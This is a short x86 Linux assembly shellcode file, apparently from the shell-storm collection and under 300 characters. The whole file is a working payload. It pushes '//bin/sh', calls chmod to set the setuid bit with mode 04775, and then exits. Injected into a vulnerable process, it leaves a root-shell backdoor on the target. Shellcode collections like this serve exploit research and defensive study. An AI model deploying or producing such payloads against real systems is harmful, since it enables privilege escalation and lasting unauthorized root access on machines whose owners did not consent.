; http://shell-storm.org/shellcode/files/shellcode-550.php
; 31 bytes

global _start

_start:
xor   eax,eax
xor   ebx,ebx
xor   ecx,ecx
push  ebx
push  dword     0x68732f6e  ; hs/n
push  dword     0x69622f2f  ; ib//
mov   ebx,esp
mov   cx,0x9fd
mov   al,0xf
int   0x80
mov   al,0x1
int   0x80
